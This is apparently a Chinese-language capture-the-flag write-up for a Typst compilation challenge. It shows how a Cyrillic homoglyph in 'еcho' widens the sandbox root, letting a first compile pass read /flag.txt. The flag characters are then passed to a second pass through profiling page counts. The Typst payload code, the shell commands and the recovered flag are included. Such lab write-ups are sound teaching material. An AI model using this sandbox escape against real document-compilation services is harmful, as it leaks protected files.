# GlacierCTF 2025 typstmk

## 题目简述

服务接收一份 Typst 文档并连续编译两次，只返回第二次生成的 PDF。第一遍 PDF 会被删除，但两次编译都把 profiling 数据写入 `/tmp/0.json`。

两条命令肉眼几乎相同，实际第一条的 `еcho` 首字母是西里尔字母 U+0435，第二条才是 ASCII `echo`。不存在的命令在 `$(...)` 中输出为空，使第一遍的 Typst root 变成 `/`；第二遍 root 正常为 `/tmp/`。攻击目标是把第一遍可读的 `/flag.txt` 通过 timings 中转到第二遍 PDF。

## 解题过程

### 1. 确认两次 sandbox root 不同

关键命令为：

```bash
typst compile --root "$(еcho ${TMPDIR:-/tmp} 2>/dev/null)/" --timings "./{n}.json" ./main.typ
rm -f ./main.pdf
typst compile --root "$(echo ${TMPDIR:-/tmp} 2>/dev/null)/" --timings "./{n}.json" ./main.typ
```

第一行的 `еcho` 不是 shell builtin，错误又被重定向，因此 command substitution 结果为空，最终是 `--root /`。这一遍可以从位于 `/tmp` 的文档使用 `read("../flag.txt")` 访问 `/flag.txt`。第二遍是 `--root /tmp/`，无法直接读取 flag，但能读取第一遍留下的 `0.json`。

### 2. 用空 timings 文件区分两遍执行

编译前脚本执行 `touch /tmp/0.json`，所以同一份 Typst 源码可以按文件是否为空分支：

```typ
#let n = read("0.json").len()

#if n <= 0 [
  // 第一遍：读取 flag 并编码到 profiling 事件数量
] else [
  // 第二遍：解析第一遍的 profiling JSON
]
```

第一遍开始时文件为空；编译结束后 Typst 将 timings JSON 写入该文件。第二遍开始时它已经非空，于是执行另一个分支。

### 3. 以页面事件数量传递一个字符

每次连接恢复一个下标 `index` 的字符。第一遍读取该字符并转为 Unicode 码点，然后生成相应数量的页面：

```typ
#for i in range(read("../flag.txt").at(index).to-unicode() - 1) [
  #lorem(100)
  #pagebreak()
]
```

Typst timings 会为每页记录一个名为 `handle page`、phase 为 begin 的事件。第二遍解析 `0.json`，把每个符合条件的事件名称写到最终 PDF：

```typ
#let events = json("0.json")
#for event in events [
  #if event.name == "handle page" and event.ph == "B" [
    #event.name #linebreak()
  ]
]
```

下载服务返回的 tar+Base64，提取 PDF 并统计 `handle page` 出现次数，该数量就是字符码点。对下标从 0 开始重复连接，直到恢复 `}`。源码实例结果为：

```text
gctf{a87df_4nd_st1ll_f4st3r_th4n_l4t3x_28b53}
```

## 方法总结

利用链由三个看似独立的小问题组成：Unicode 同形字让第一遍 root 意外变成 `/`，profiling 文件跨编译保留，预创建的空文件又让同一份 Typst 文档识别自己处于第几遍。第一遍读取秘密并把字符编码成事件数量，第二遍将事件打印进可下载 PDF。审计 shell 命令时应检查 Unicode code point，而非只靠肉眼；设计编译沙箱时也不能让 profiling、缓存或中间产物跨越不同权限的执行阶段。
